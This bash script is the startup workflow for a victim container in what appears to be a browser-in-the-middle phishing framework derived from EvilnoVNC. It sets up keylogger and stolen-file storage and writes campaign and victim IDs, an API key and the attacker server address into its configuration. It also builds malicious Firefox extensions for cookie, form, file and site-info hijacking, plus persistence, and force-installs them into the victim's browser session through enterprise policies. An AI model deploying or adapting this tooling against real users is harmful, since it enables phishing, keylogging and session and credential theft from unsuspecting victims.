#!/bin/bash
# VNC startup workflow adapted from JoelGMSec/EvilnoVNC:
# https://github.com/JoelGMSec/EvilnoVNC
# EvilnoVNC is licensed under the GNU General Public License version 3.
# Modified by P-BitM, 2026.

set -euo pipefail

fail_invalid_env() {
    echo "Invalid victim container environment: $1" >&2
    exit 1
}

require_identifier() {
    [[ -n "$2" && "$2" =~ ^[A-Za-z0-9_-]+$ ]] \
        || fail_invalid_env "$1"
}

require_host() {
    [[ -n "$2" && "$2" =~ ^[A-Za-z0-9.:_-]+$ ]] \
        || fail_invalid_env "$1"
}

require_port() {
    [[ "$2" =~ ^[0-9]+$ ]] \
        && ((10#$2 >= 1 && 10#$2 <= 65535)) \
        || fail_invalid_env "$1"
}

require_identifier "CONTAINER_NAME" "$CONTAINER_NAME"
require_identifier "CAMPAIGN_ID" "$CAMPAIGN_ID"
require_identifier "VICTIM_ID" "$VICTIM_ID"
require_identifier "VICTIM_API_KEY" "$VICTIM_API_KEY"
require_host "IP" "$IP"
require_port "CUSTOM_PORT" "$CUSTOM_PORT"
[[ "$THEME" == "light" || "$THEME" == "dark" || "$THEME" == "unknown" ]] \
    || fail_invalid_env "THEME"

IFS=',' read -ra EXT_ARR <<< "$EXTENSIONS"
for EXT in "${EXT_ARR[@]}"; do
    require_identifier "EXTENSIONS entry" "$EXT"
done

# Set DISPLAY env
export DISPLAY=:0
# The bind-mounted storage directory is created by the control plane, but the
# desktop processes run as `bitm`. Keep collected data host-readable while
# allowing the keylogger to create and rotate its log.
install -d -o bitm -g bitm -m 0755 /storage
install -d -o bitm -g bitm -m 0755 /storage/files_hijacked
if [ -e /storage/keylogs.txt ]; then
    chown bitm:bitm /storage/keylogs.txt
    chmod 0644 /storage/keylogs.txt
fi
install -d -o bitm -g bitm -m 0755 \
    /home/bitm/.cache /home/bitm/.config
install -d -o root -g root -m 1777 /tmp/.X11-unix
sed -i "s|SERVER_IP|$IP|g" /bitm/app/noVNC/index.html
sed -i "s|PORT|$CUSTOM_PORT|g" /bitm/app/noVNC/index.html
sed -i "s|CONTAINER_NAME|$CONTAINER_NAME|g" /bitm/app/noVNC/index.html

if [ "$THEME" == "light" ]; then
    sed -i "s|THEME|0|g" /bitm/.mozilla/firefox/bitm-profile/user.js
else
    sed -i "s|THEME|1|g" /bitm/.mozilla/firefox/bitm-profile/user.js
fi
sed -i "s|CAMPAIGN_ID|$CAMPAIGN_ID|g" /bitm/.mozilla/firefox/bitm-profile/user.js

sed -i "s|NOVNC_PORT|$CUSTOM_PORT|g" /etc/supervisor/conf.d/supervisord.conf

sed -i "s|SERVER_IP|$IP/|g" /bitm/app/bad_firefox_extensions/file-hijacking/background.js
sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/file-hijacking/background.js

sed -i "s|SERVER_IP|$IP|g" /bitm/app/bad_firefox_extensions/site-info-hijacking/background.js
sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/site-info-hijacking/background.js

sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/form-interceptor/background.js
sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/cookie-hijacking/background.js

sed -i "s|CAMPAIGN_IP|$IP|g" /etc/nginx/conf.d/local-proxy.conf
sed -i "s|CAMPAIGN_ID|$CAMPAIGN_ID|g" /etc/nginx/conf.d/local-proxy.conf
sed -i "s|VICTIM_API_KEY|$VICTIM_API_KEY|g" /etc/nginx/conf.d/local-proxy.conf


cd /bitm/app/bad_firefox_extensions/file-hijacking/ && zip -r ../file-hijacking.xpi *
cd /bitm/app/bad_firefox_extensions/persistence/ && zip -r ../persistence.xpi *
cd /bitm/app/bad_firefox_extensions/disable-shortcuts/ && zip -r ../disable-shortcuts.xpi *
cd /bitm/app/bad_firefox_extensions/site-info-hijacking/ && zip -r ../site-info-hijacking.xpi *
cd /bitm/app/bad_firefox_extensions/form-interceptor/ && zip -r ../form-interceptor.xpi *
cd /bitm/app/bad_firefox_extensions/cookie-hijacking/ && zip -r ../cookie-hijacking.xpi *

# Select the debug-friendly policy in development/default mode while retaining
# the hardened policy in kiosk mode. Then inject extensions as structured JSON.
POLICIES_FILE=/etc/firefox/policies/policies.json
if [ "${MODE:-}" = "default" ]; then
    POLICIES_SOURCE="${POLICIES_FILE}.dev"
else
    POLICIES_SOURCE="${POLICIES_FILE}.prod"
fi
cp "$POLICIES_SOURCE" "$POLICIES_FILE"
POLICIES_TMP=$(mktemp "${POLICIES_FILE}.XXXXXX")
trap 'rm -f "$POLICIES_TMP"' EXIT
EXTENSION_PATHS=()
for EXT in "${EXT_ARR[@]}"; do
    EXTENSION_PATH="/bitm/app/bad_firefox_extensions/${EXT}.xpi"
    [[ -f "$EXTENSION_PATH" ]] || fail_invalid_env "missing extension: $EXT"
    EXTENSION_PATHS+=("$EXTENSION_PATH")
done
if ((${#EXTENSION_PATHS[@]})); then
    EXTENSIONS_JSON=$(printf '%s\n' "${EXTENSION_PATHS[@]}" | jq -R . | jq -s .)
else
    EXTENSIONS_JSON='[]'
fi
jq --argjson installs "$EXTENSIONS_JSON" \
    '.policies.Extensions.Install = $installs' \
    "$POLICIES_FILE" > "$POLICIES_TMP"
chmod 0644 "$POLICIES_TMP"
mv "$POLICIES_TMP" "$POLICIES_FILE"
trap - EXIT

# Start supervisord
nginx &
supervisord -c /etc/supervisor/conf.d/supervisord.conf &

while true ; do sleep 30 ; done
